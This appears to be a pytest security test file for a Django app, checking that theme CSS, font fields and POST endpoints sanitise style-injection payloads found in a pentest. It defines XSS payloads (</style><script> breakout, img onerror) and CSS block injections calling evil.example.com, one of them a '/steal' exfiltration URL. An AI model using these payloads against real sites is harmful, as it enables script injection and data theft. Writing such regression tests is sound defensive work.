"""
Security tests for CSS/style injection vulnerabilities.

Pentest finding: web components and templates that accept style props (CSS
customisation fields) can be exploited to inject arbitrary HTML or JavaScript
by breaking out of the enclosing <style> block.

Attack surfaces identified and tested here:

  Surface 1  normalize_daisyui_builder_css (theme_utils.py)
             CSS var values allow <, >, { } characters → </style> breakout
             or CSS block injection.

  Surface 2  parse_custom_theme_config (themes.py)
             CSS var values extracted by regex without sanitizing HTML characters.

  Surface 3  theme_vars_to_css (themes.py)
             Values written to CSS output without sanitizing HTML characters.

  Surface 4  generate_theme_css_for_brand (themes.py)
             When parse_custom_theme_config returns None (no --var patterns found),
             the raw user input is passed through unchanged as the CSS string,
             which is later rendered with |safe in the templates.

  Surface 5  Template rendering via SiteBranding.theme_light_css / theme_dark_css
             rendered as {{ brand.theme_css_light|safe }} in base.html,
             base_minimal.html, and admin/base_site.html.

  Surface 6  Template rendering via Organization.theme_light_css / theme_dark_css
             same |safe rendering, but values come from org-owner-editable fields.

  Surface 7  POST endpoints – update_org_theme and update_branding
             Raw POST values reach the storage/generation pipeline without
             sanitization, so a stored payload survives to the template.

  Surface 8  brand.font_heading / brand.font_body inside <style>
             Django auto-escaping prevents HTML breakout but NOT CSS block
             injection via unescaped ; } { characters.
"""

import pytest
from django.contrib.auth.models import User
from django.test import Client

from checktick_app.core.models import SiteBranding
from checktick_app.core.theme_utils import normalize_daisyui_builder_css
from checktick_app.core.themes import (
    generate_theme_css_for_brand,
    parse_custom_theme_config,
    theme_vars_to_css,
)

FIXTURE_CRED = "test-pass-Str0ng!"  # noqa: S105 - test fixture only, not a real credential

# ---------------------------------------------------------------------------
# Shared attack payloads
# ---------------------------------------------------------------------------
STYLE_BREAKOUT = "</style><script>alert('XSS')</script><style>"
SCRIPT_TAG_IN_VALUE = "oklch(50% 0.2 180)<script>alert(1)</script>"
HTML_TAG_IN_VALUE = "oklch(50% 0.2 180)<img src=x onerror=alert(1)>"
BLOCK_INJECTION = "red} body{background:url(https://evil.example.com/){"
BLOCK_CLOSE_ONLY = "red}"


# ===========================================================================
# Surface 1 – normalize_daisyui_builder_css
# ===========================================================================


def test_normalize_css_blocks_style_tag_breakout():
    """
    SURFACE 1 – normalize_daisyui_builder_css must not allow </style> in values.

    If an attacker submits --p: red</style><script>alert(1)</script> the current
    code extracts the value with [^;]+ (which matches '<', '>') and writes it
    verbatim.  After the fix, < and > must be stripped from values.
    """
    raw = f"--p: {STYLE_BREAKOUT};"
    result = normalize_daisyui_builder_css(raw)
    assert "</style>" not in result, (
        "normalize_daisyui_builder_css must strip </style> from CSS values"
    )
    assert "<script>" not in result, (
        "normalize_daisyui_builder_css must strip <script> from CSS values"
    )


def test_normalize_css_blocks_html_tag_in_value():
    """SURFACE 1 – HTML tags in CSS variable values must be stripped.

    After < and > are removed, <img src=x onerror=...> cannot form an HTML tag.
    The angle brackets are the enabling characters; stripping them is sufficient
    to prevent HTML injection in the CSS context.
    """
    raw = f"--color-primary: {HTML_TAG_IN_VALUE};"
    result = normalize_daisyui_builder_css(raw)
    # < removed → <img cannot form a valid HTML tag
    assert "<img" not in result, "< must be stripped to prevent HTML tag injection"
    # > removed → attribute value cannot close an HTML tag
    assert ">" not in result, "> must be stripped"


def test_normalize_css_blocks_block_injection():
    """
    SURFACE 1 – A closing brace in a CSS value would break out of the enclosing
    selector block and let an attacker open new CSS rules.
    """
    raw = f"--color-primary: {BLOCK_INJECTION};"
    result = normalize_daisyui_builder_css(raw)
    # The sanitised value should not contain } or {
    assert "}" not in result, "} in CSS value allows CSS block injection"
    assert "{" not in result, "{ in CSS value allows CSS block injection"


def test_normalize_css_preserves_valid_values():
    """SURFACE 1 – sanitisation must not break legitimate oklch / hex values."""
    # Use distinct mapping targets to avoid key collisions
    # (--color-primary and --color-secondary map to --p and --s respectively)
    raw = (
        "--color-primary: oklch(65% 0.21 25);\n"
        "--color-secondary: #3b82f6;\n"
        "--radius-box: 0.5rem;\n"
    )
    result = normalize_daisyui_builder_css(raw)
    assert "oklch(65% 0.21 25)" in result
    assert "#3b82f6" in result
    assert "0.5rem" in result


# ===========================================================================
# Surface 2 – parse_custom_theme_config
# ===========================================================================


def test_parse_custom_theme_config_sanitizes_html_in_value():
    """
    SURFACE 2 – parse_custom_theme_config extracts values with [^;]+ which
    allows angle brackets.  A payload of
        --color-primary: red</style><script>alert(1)</script>
    currently produces {"--color-primary": "red</style><script>alert(1)</script>"}.
    After the fix, the value must not contain < or >.
    """
    config = f"--color-primary: red{STYLE_BREAKOUT};"
    result = parse_custom_theme_config(config)
    assert result is not None
    primary = result.get("--color-primary", "")
    assert "<" not in primary, "parse_custom_theme_config must strip < from values"
    assert ">" not in primary, "parse_custom_theme_config must strip > from values"


def test_parse_custom_theme_config_sanitizes_block_injection():
    """SURFACE 2 – CSS block injection via } in extracted value."""
    config = f"--color-secondary: {BLOCK_INJECTION};"
    result = parse_custom_theme_config(config)
    assert result is not None
    val = result.get("--color-secondary", "")
    assert "}" not in val, "parse_custom_theme_config must strip } from values"
    assert "{" not in val, "parse_custom_theme_config must strip { from values"


# ===========================================================================
# Surface 3 – theme_vars_to_css
# ===========================================================================


def test_theme_vars_to_css_strips_html_in_values():
    """
    SURFACE 3 – theme_vars_to_css writes values directly into a CSS string
    which is later injected with |safe.  If a value contains </style> or
    <script> it will be rendered verbatim in the page.
    """
    malicious_vars = {
        "--color-primary": f"red{STYLE_BREAKOUT}",
        "--radius-box": "0.5rem",
    }
    output = theme_vars_to_css(malicious_vars)
    assert "<script>" not in output, "theme_vars_to_css must strip <script> from output"
    assert "</style>" not in output, "theme_vars_to_css must strip </style> from output"


def test_theme_vars_to_css_strips_block_injection():
    """SURFACE 3 – closing brace in a value breaks out of the theme rule block."""
    malicious_vars = {"--color-primary": BLOCK_INJECTION}
    output = theme_vars_to_css(malicious_vars)
    # The only } that should appear is the enclosing selector brace if any;
    # raw } inside a value is the injection vector.
    # theme_vars_to_css itself doesn't wrap output in braces, so any } present
    # would come from the unsanitised value.
    assert "}" not in output, "theme_vars_to_css must strip } from CSS values"


# ===========================================================================
# Surface 4 – generate_theme_css_for_brand raw passthrough
# ===========================================================================


def test_generate_theme_css_for_brand_no_raw_passthrough_on_parse_failure():
    """
    SURFACE 4 – When parse_custom_theme_config returns None (no --var patterns
    found in the input), generate_theme_css_for_brand currently falls back to
        light_css = custom_css_light   ← raw, unsanitised input
    This means a payload like </style><script>alert(1)</script> with no --var
    declarations passes through and is later rendered with |safe.

    After the fix the fallback must *not* pass raw input through; it should
    produce either an empty string or a sanitised/normalised result.
    """
    attack = STYLE_BREAKOUT  # no --var lines, so parse returns None
    light_css, _ = generate_theme_css_for_brand(
        preset_light="wireframe",
        preset_dark="business",
        custom_css_light=attack,
        custom_css_dark="",
    )
    assert "<script>" not in light_css, (
        "generate_theme_css_for_brand must not pass raw unparseable input through as CSS"
    )
    assert "</style>" not in light_css, (
        "generate_theme_css_for_brand must not pass </style> through to rendered output"
    )


def test_generate_theme_css_for_brand_sanitizes_angle_brackets_in_vars():
    """
    SURFACE 4 – Even when the input does contain --var lines, angle brackets
    in values must not appear in the output.
    """
    attack = f"--color-primary: red{STYLE_BREAKOUT};"
    light_css, _ = generate_theme_css_for_brand(
        preset_light="wireframe",
        preset_dark="business",
        custom_css_light=attack,
        custom_css_dark="",
    )
    assert "<script>" not in light_css
    assert "</style>" not in light_css


# ===========================================================================
# Surface 5 & 6 – Template rendering (SiteBranding and Org theme)
# ===========================================================================


@pytest.mark.django_db
def test_rendered_page_blocks_style_breakout_via_sitebranding_light():
    """
    SURFACE 5 – SiteBranding.theme_light_css is rendered with |safe in
    base.html, base_minimal.html and admin/base_site.html.

    Storing a </style><script> payload and then rendering the page must NOT
    result in the payload appearing unescaped in the response body.
    """
    SiteBranding.objects.all().delete()
    SiteBranding.objects.create(
        theme_light_css=STYLE_BREAKOUT,
    )

    client = Client()
    response = client.get("/home")
    assert response.status_code == 200
    content = response.content.decode()
    assert "<script>alert" not in content, (
        "Malicious <script> tag from theme_light_css must not appear in rendered page"
    )


@pytest.mark.django_db
def test_rendered_page_blocks_style_breakout_via_sitebranding_dark():
    """SURFACE 5 – Same as above for theme_dark_css."""
    SiteBranding.objects.all().delete()
    SiteBranding.objects.create(
        theme_dark_css=STYLE_BREAKOUT,
    )

    client = Client()
    response = client.get("/home")
    assert response.status_code == 200
    content = response.content.decode()
    assert "<script>alert" not in content, (
        "Malicious <script> tag from theme_dark_css must not appear in rendered page"
    )


@pytest.mark.django_db
def test_rendered_page_blocks_css_block_injection_via_sitebranding():
    """
    SURFACE 5 – CSS block injection: if a } in the theme CSS value closes the
    [data-theme] selector, an attacker can open arbitrary new rules.
    """
    SiteBranding.objects.all().delete()
    # Payload closes the rule block and adds an arbitrary new rule
    payload = "red} a::after{content:url(https://evil.example.com/steal?x="
    SiteBranding.objects.create(theme_light_css=f"--p: {payload};")

    client = Client()
    response = client.get("/home")
    assert response.status_code == 200
    content = response.content.decode()
    # The literal unbalanced } from the payload should not appear in the CSS output
    assert "evil.example.com" not in content, (
        "CSS exfiltration URL must not appear in page – block injection not prevented"
    )


@pytest.mark.django_db
def test_rendered_page_blocks_style_breakout_via_org_theme(django_db_setup):
    """
    SURFACE 6 – Organization.theme_light_css is also rendered with |safe via
    the same context processor.  An org owner who stores a malicious payload
    would expose it to every member viewing any page.

    The org cascade fires when at least one of default_theme / theme_preset_light
    / theme_preset_dark is set, so we set theme_preset_light here.
    """
    from checktick_app.surveys.models import Organization

    owner = User.objects.create_user(
        username="orgowner_style_test",
        email="owner_style@test.com",
        password=FIXTURE_CRED,
    )
    org = Organization.objects.create(owner=owner, name="Pentest Org")
    # Must set a preset to trigger the org theme cascade in context_processors.py
    org.theme_preset_light = "wireframe"
    org.theme_light_css = STYLE_BREAKOUT
    org.save()

    SiteBranding.objects.all().delete()
    SiteBranding.objects.create()

    client = Client()
    client.force_login(owner)
    response = client.get("/home")
    assert response.status_code == 200
    content = response.content.decode()
    assert "<script>alert" not in content, (
        "Malicious <script> tag from org theme_light_css must not appear in rendered page"
    )


# ===========================================================================
# Surface 7 – POST endpoints (org theme & site branding)
# ===========================================================================


@pytest.mark.django_db
def test_update_org_theme_endpoint_sanitizes_light_css():
    """
    SURFACE 7 – The update_org_theme POST handler passes raw CSS through
    generate_theme_css_for_brand, which falls back to raw input on parse
    failure.  The stored value is then rendered with |safe on every page load.

    After the fix, the stored org.theme_light_css must not contain </style>.
    """
    from checktick_app.surveys.models import Organization

    owner = User.objects.create_user(
        username="orgowner_post_test",
        email="owner_post@test.com",
        password=FIXTURE_CRED,
    )
    Organization.objects.create(owner=owner, name="Theme POST Test Org")
    SiteBranding.objects.all().delete()
    SiteBranding.objects.create()

    client = Client()
    client.force_login(owner)
    response = client.post(
        "/profile",
        {
            "action": "update_org_theme",
            "org_theme_preset_light": "wireframe",
            "org_theme_preset_dark": "business",
            "org_theme_light_css": STYLE_BREAKOUT,
            "org_theme_dark_css": "",
        },
    )
    assert response.status_code in (200, 302)

    org = Organization.objects.get(owner=owner)
    assert "</style>" not in (org.theme_light_css or ""), (
        "Stored org.theme_light_css must not contain </style> after POST sanitization"
    )
    assert "<script>" not in (org.theme_light_css or ""), (
        "Stored org.theme_light_css must not contain <script> after POST sanitization"
    )


@pytest.mark.django_db
def test_update_org_theme_endpoint_sanitizes_dark_css():
    """SURFACE 7 – Same for dark theme CSS."""
    from checktick_app.surveys.models import Organization

    owner = User.objects.create_user(
        username="orgowner_dark_test",
        email="owner_dark@test.com",
        password=FIXTURE_CRED,
    )
    Organization.objects.create(owner=owner, name="Dark CSS Test Org")
    SiteBranding.objects.all().delete()
    SiteBranding.objects.create()

    client = Client()
    client.force_login(owner)
    client.post(
        "/profile",
        {
            "action": "update_org_theme",
            "org_theme_preset_light": "wireframe",
            "org_theme_preset_dark": "business",
            "org_theme_light_css": "",
            "org_theme_dark_css": STYLE_BREAKOUT,
        },
    )

    org = Organization.objects.get(owner=owner)
    assert "</style>" not in (org.theme_dark_css or ""), (
        "Stored org.theme_dark_css must not contain </style>"
    )


@pytest.mark.django_db
def test_update_sitebranding_endpoint_sanitizes_light_css():
    """
    SURFACE 7 – The update_branding POST handler (superuser only) stores raw
    CSS via the same pipeline.  The stored value must be sanitized before storage.
    """
    superuser = User.objects.create_superuser(
        username="su_style_test",
        email="su_style@test.com",
        password=FIXTURE_CRED,
    )
    SiteBranding.objects.all().delete()
    SiteBranding.objects.create()

    client = Client()
    client.force_login(superuser)
    client.post(
        "/profile",
        {
            "action": "update_branding",
            "theme_preset_light": "wireframe",
            "theme_preset_dark": "business",
            "theme_light_css": STYLE_BREAKOUT,
            "theme_dark_css": "",
        },
    )

    sb = SiteBranding.objects.first()
    assert sb is not None
    assert "</style>" not in (sb.theme_light_css or ""), (
        "Stored SiteBranding.theme_light_css must not contain </style>"
    )
    assert "<script>" not in (sb.theme_light_css or ""), (
        "Stored SiteBranding.theme_light_css must not contain <script>"
    )


# ===========================================================================
# Surface 8 – font_heading / font_body CSS property injection inside <style>
# ===========================================================================


@pytest.mark.django_db
def test_rendered_page_blocks_font_heading_block_injection():
    """
    SURFACE 8 – brand.font_heading is rendered inside a <style> block without
    |safe (so Django auto-escaping handles < > but NOT ; } {).

    A value like:
        Arial; } h1 { background: url(https://evil.example.com/?

    would close the :root block and open a new h1 rule in the rendered CSS.
    After the fix the stored value must have ; } { stripped.
    """
    SiteBranding.objects.all().delete()
    payload = "Arial; } h1 { background: url(https://evil.example.com/?"
    SiteBranding.objects.create(font_heading=payload)

    client = Client()
    response = client.get("/home")
    assert response.status_code == 200
    content = response.content.decode()
    # The literal unescaped } from the payload must not appear inside the style block
    assert "evil.example.com" not in content, (
        "CSS block injection via font_heading must not reach the rendered page"
    )


@pytest.mark.django_db
def test_rendered_page_blocks_font_body_block_injection():
    """SURFACE 8 – Same for brand.font_body."""
    SiteBranding.objects.all().delete()
    payload = "'Roboto', sans-serif; } a { color: red; }"
    SiteBranding.objects.create(font_body=payload)

    client = Client()
    response = client.get("/home")
    assert response.status_code == 200
    content = response.content.decode()
    # Unbalanced } that would close the :root block must be stripped
    # We test via absence of the injected rule body
    assert "color: red; }" not in content, (
        "CSS block injection via font_body must not reach the rendered page"
    )
